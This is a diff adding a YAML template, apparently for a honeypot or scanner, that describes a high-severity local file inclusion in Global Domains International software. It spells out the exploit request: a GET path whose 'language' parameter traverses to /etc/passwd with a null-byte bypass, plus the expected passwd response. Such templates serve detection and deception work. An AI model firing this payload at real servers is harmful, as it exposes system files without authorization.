@@ -1,0 +1,26 @@
+id: global-domains-lfi
+info:
+  name: Global Domains International - Local File Inclusion
+  author: 0x_Akoko
+  description: Global Domains International is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://cxsecurity.com/issue/WLB-2018020247
+  - http://www.nic.ws
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: globaldomains,lfi,traversal
+traps:
+- request:
+    method: GET
+    path: /kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: root:[x*]:0:0
